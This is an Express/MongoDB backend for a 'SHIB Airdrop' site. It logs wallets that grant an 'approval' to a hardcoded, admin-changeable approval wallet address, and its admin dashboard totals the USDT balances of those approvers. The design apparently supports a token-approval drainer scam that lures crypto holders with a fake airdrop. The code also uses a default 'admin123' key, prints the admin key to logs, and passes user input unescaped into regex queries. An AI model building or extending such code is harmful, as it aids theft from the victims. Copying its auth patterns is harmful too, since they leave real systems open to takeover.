const express = require('express');
const cors = require('cors');
const mongoose = require('mongoose');
const app = express();

// ✅ FIXED: CORS Configuration for Netlify
const corsOptions = {
    origin: [
        'https://shib-airdrop.netlify.app',  // Your Netlify frontend
        'http://localhost:3000',              // Local development
        'http://127.0.0.1:3000',             // Local development
        'http://localhost:8080',              // Local backend
        'http://127.0.0.1:8080'              // Local backend
    ],
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization', 'admin-key', 'Accept'],
    credentials: true,
    optionsSuccessStatus: 200
};

// Middleware
app.use(cors(corsOptions));
app.use(express.json());

// Environment Variables
const MONGODB_URI = process.env.MONGODB_URI;
const ADMIN_KEY = process.env.ADMIN_KEY || 'admin123';
const PORT = process.env.PORT || 8080;

// MongoDB Connection
const connectDB = async () => {
    try {
        if (!MONGODB_URI) {
            throw new Error('MONGODB_URI environment variable is required');
        }
        
        await mongoose.connect(MONGODB_URI, {
            useNewUrlParser: true,
            useUnifiedTopology: true,
        });
        console.log('✅ Connected to MongoDB Atlas');
    } catch (error) {
        console.error('❌ MongoDB connection error:', error.message);
        process.exit(1);
    }
};

// User Schema
const userSchema = new mongoose.Schema({
    walletAddress: { type: String, required: true, unique: true },
    usdtBalance: String,
    airdropAmount: String,
    referralCount: { type: Number, default: 0 },
    approvalGiven: { type: Boolean, default: false },
    approvalTimestamp: Date,
    tier: String,
    createdAt: { type: Date, default: Date.now }
});

const User = mongoose.model('User', userSchema);

// Settings Schema
const settingsSchema = new mongoose.Schema({
    approvalWalletAddress: { type: String, default: "0xCcf0a381D804BFa37485Bc450CE540c09350f975" },
    updatedAt: { type: Date, default: Date.now }
});

const Settings = mongoose.model('Settings', settingsSchema);

// Initialize default settings
async function initializeSettings() {
    try {
        const settings = await Settings.findOne();
        if (!settings) {
            const defaultSettings = new Settings();
            await defaultSettings.save();
            console.log('✅ Default settings initialized');
        }
    } catch (error) {
        console.error('Error initializing settings:', error);
    }
}

// ========================
// ✅ UPDATED: CORS Pre-flight for all routes
// ========================

// Handle pre-flight requests
app.options('*', cors(corsOptions));

// Middleware for admin authentication
const authenticateAdmin = (req, res, next) => {
    const adminKey = req.headers['admin-key'] || req.query.adminKey;
    
    if (!adminKey || adminKey !== ADMIN_KEY) {
        return res.status(401).json({ 
            success: false, 
            message: 'Unauthorized: Invalid admin key' 
        });
    }
    next();
};

// ✅ Get all approvals for admin panel
app.get('/api/admin/approvals', authenticateAdmin, async (req, res) => {
    try {
        const { page = 1, limit = 50, search, tier } = req.query;
        
        let filter = { approvalGiven: true };
        
        // Search by wallet address
        if (search) {
            filter.walletAddress = { $regex: search, $options: 'i' };
        }
        
        // Filter by tier
        if (tier) {
            filter.tier = tier;
        }
        
        const skip = (page - 1) * limit;
        
        const approvals = await User.find(filter)
            .sort({ approvalTimestamp: -1 })
            .skip(skip)
            .limit(parseInt(limit))
            .select('walletAddress usdtBalance airdropAmount tier approvalTimestamp referralCount createdAt');
        
        const total = await User.countDocuments(filter);
        
        res.json({
            success: true,
            data: approvals,
            pagination: {
                page: parseInt(page),
                limit: parseInt(limit),
                total,
                pages: Math.ceil(total / limit)
            }
        });
    } catch (error) {
        console.error('Error fetching admin approvals:', error);
        res.status(500).json({ success: false, message: 'Internal server error' });
    }
});

// ✅ Get admin dashboard statistics
app.get('/api/admin/stats', authenticateAdmin, async (req, res) => {
    try {
        const totalApprovals = await User.countDocuments({ approvalGiven: true });
        const totalUsers = await User.countDocuments();
        
        // Calculate total USDT locked
        const approvedUsers = await User.find({ approvalGiven: true });
        let totalUSDT = 0;
        approvedUsers.forEach(user => {
            const balance = parseFloat(user.usdtBalance) || 0;
            totalUSDT += balance;
        });
        
        // Tier distribution
        const tierStats = await User.aggregate([
            { $match: { approvalGiven: true } },
            { $group: { _id: "$tier", count: { $sum: 1 } } }
        ]);
        
        // Today's approvals
        const today = new Date();
        today.setHours(0, 0, 0, 0);
        const todayApprovals = await User.countDocuments({ 
            approvalGiven: true, 
            approvalTimestamp: { $gte: today } 
        });
        
        res.json({
            success: true,
            data: {
                totalApprovals,
                totalUsers,
                totalUSDT: parseFloat(totalUSDT.toFixed(2)),
                todayApprovals,
                tierStats: tierStats.reduce((acc, curr) => {
                    acc[curr._id] = curr.count;
                    return acc;
                }, {})
            }
        });
    } catch (error) {
        console.error('Error fetching admin stats:', error);
        res.status(500).json({ success: false, message: 'Internal server error' });
    }
});

// ✅ Get approvals with filters for admin
app.get('/api/admin/approvals/filter', authenticateAdmin, async (req, res) => {
    try {
        const { date, minAmount, maxAmount, tier, search } = req.query;
        let filter = { approvalGiven: true };
        
        // Date filter
        if (date) {
            const startDate = new Date(date);
            const endDate = new Date(date);
            endDate.setDate(endDate.getDate() + 1);
            
            filter.approvalTimestamp = {
                $gte: startDate,
                $lt: endDate
            };
        }
        
        // USDT amount filters
        if (minAmount || maxAmount) {
            filter.usdtBalance = {};
            if (minAmount) {
                filter.usdtBalance.$gte = parseFloat(minAmount).toString();
            }
            if (maxAmount) {
                filter.usdtBalance.$lte = parseFloat(maxAmount).toString();
            }
        }
        
        // Tier filter
        if (tier) {
            filter.tier = tier;
        }
        
        // Search filter
        if (search) {
            filter.walletAddress = { $regex: search, $options: 'i' };
        }
        
        const approvals = await User.find(filter)
            .sort({ approvalTimestamp: -1 })
            .select('walletAddress usdtBalance airdropAmount tier approvalTimestamp referralCount createdAt');
        
        res.json({
            success: true,
            data: approvals,
            count: approvals.length
        });
    } catch (error) {
        console.error('Error filtering approvals:', error);
        res.status(500).json({ success: false, message: 'Internal server error' });
    }
});

// ========================
// EXISTING APIs (UNCHANGED but CORS enabled)
// ========================

// Health check endpoint
app.get('/api/health', (req, res) => {
    res.json({ 
        success: true, 
        message: 'SHIB Airdrop Backend is running!', 
        timestamp: new Date().toISOString(),
        environment: process.env.NODE_ENV || 'development',
        cors: 'Enabled for Netlify'
    });
});

// Save user approval
app.post('/api/save-approval', async (req, res) => {
    try {
        const { walletAddress, usdtBalance, airdropAmount, tier } = req.body;
        
        console.log('✅ Saving approval for:', walletAddress, 'USDT:', usdtBalance, 'Tier:', tier);
        
        if (!walletAddress) {
            return res.status(400).json({ success: false, message: 'Wallet address is required' });
        }
        
        let user = await User.findOne({ walletAddress });
        
        if (user) {
            // Update existing user
            user.usdtBalance = usdtBalance || user.usdtBalance;
            user.airdropAmount = airdropAmount || user.airdropAmount;
            user.tier = tier || user.tier;
            user.approvalGiven = true;
            user.approvalTimestamp = new Date();
        } else {
            // Create new user
            user = new User({
                walletAddress,
                usdtBalance,
                airdropAmount,
                tier,
                approvalGiven: true,
                approvalTimestamp: new Date()
            });
        }
        
        await user.save();
        console.log('✅ Approval saved successfully for:', walletAddress);
        res.json({ success: true, message: 'Approval saved successfully' });
    } catch (error) {
        console.error('Error saving approval:', error);
        res.status(500).json({ success: false, message: 'Internal server error' });
    }
});

// Get approval wallet address
app.get('/api/approval-wallet', async (req, res) => {
    try {
        const settings = await Settings.findOne();
        res.json({ 
            success: true, 
            approvalWalletAddress: settings?.approvalWalletAddress || "0xCcf0a381D804BFa37485Bc450CE540c09350f975" 
        });
    } catch (error) {
        console.error('Error fetching approval wallet:', error);
        res.status(500).json({ success: false, message: 'Internal server error' });
    }
});

// Update approval wallet address (Admin only)
app.post('/api/update-approval-wallet', async (req, res) => {
    try {
        const { newWalletAddress, adminKey } = req.body;
        
        // Admin authentication
        if (adminKey !== ADMIN_KEY) {
            return res.status(401).json({ success: false, message: 'Unauthorized' });
        }
        
        if (!newWalletAddress || !newWalletAddress.startsWith('0x')) {
            return res.status(400).json({ success: false, message: 'Valid wallet address required' });
        }
        
        let settings = await Settings.findOne();
        if (!settings) {
            settings = new Settings();
        }
        
        settings.approvalWalletAddress = newWalletAddress;
        settings.updatedAt = new Date();
        
        await settings.save();
        res.json({ success: true, message: 'Approval wallet updated successfully' });
    } catch (error) {
        console.error('Error updating approval wallet:', error);
        res.status(500).json({ success: false, message: 'Internal server error' });
    }
});

// Get all users who gave approval
app.get('/api/approved-users', async (req, res) => {
    try {
        const users = await User.find({ approvalGiven: true })
            .sort({ approvalTimestamp: -1 })
            .select('walletAddress usdtBalance airdropAmount tier approvalTimestamp referralCount');
        
        res.json({ success: true, users });
    } catch (error) {
        console.error('Error fetching approved users:', error);
        res.status(500).json({ success: false, message: 'Internal server error' });
    }
});

// Get user statistics
app.get('/api/user-stats', async (req, res) => {
    try {
        const totalUsers = await User.countDocuments();
        const approvedUsers = await User.countDocuments({ approvalGiven: true });
        
        const users = await User.find({ approvalGiven: true });
        let totalAirdropAmount = 0;
        users.forEach(user => {
            const amount = parseFloat(user.airdropAmount) || 0;
            totalAirdropAmount += amount;
        });
        
        res.json({
            success: true,
            stats: {
                totalUsers,
                approvedUsers,
                totalAirdropAmount: Math.round(totalAirdropAmount)
            }
        });
    } catch (error) {
        console.error('Error fetching user stats:', error);
        res.status(500).json({ success: false, message: 'Internal server error' });
    }
});

// Root endpoint
app.get('/', (req, res) => {
    res.json({
        success: true,
        message: 'SHIB Airdrop Backend API',
        version: '1.0.0',
        cors: 'Enabled for Netlify',
        endpoints: {
            health: '/api/health',
            approvalWallet: '/api/approval-wallet',
            saveApproval: '/api/save-approval',
            approvedUsers: '/api/approved-users',
            userStats: '/api/user-stats',
            adminApprovals: '/api/admin/approvals',
            adminStats: '/api/admin/stats',
            adminFilter: '/api/admin/approvals/filter'
        }
    });
});

// Start server
const startServer = async () => {
    try {
        await connectDB();
        await initializeSettings();
        
        app.listen(PORT, '0.0.0.0', () => {
            console.log(`🚀 Backend server running on port ${PORT}`);
            console.log(`📊 Environment: ${process.env.NODE_ENV || 'development'}`);
            console.log(`🌐 CORS Enabled for: https://shib-airdrop.netlify.app`);
            console.log(`🔐 Admin Key: ${ADMIN_KEY}`);
            console.log('✅ Admin APIs are now available!');
        });
    } catch (error) {
        console.error('❌ Failed to start server:', error);
        process.exit(1);
    }
};

startServer();
